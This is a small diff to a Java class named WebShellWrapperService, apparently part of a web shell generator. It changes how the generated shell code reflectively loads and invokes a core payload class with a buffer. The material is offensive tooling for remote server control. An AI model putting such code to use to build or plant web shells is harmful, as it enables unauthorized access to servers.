@@ -126,7 +126,8 @@ public final class WebShellWrapperService {
     }
 
     private static String invokeCore(String className) {
-        return "Class.forName(\"" + className + "\").newInstance().equals(leoBuffer);";
+        return "try { ((java.lang.reflect.InvocationHandler) Class.forName(\"" + className
+                + "\").newInstance()).invoke(null, null, new Object[]{leoBuffer}); } catch (Throwable e) { throw new IllegalStateException(\"Core invocation failed\", e); }";
     }
 
     private static String writeHttpResponse() {
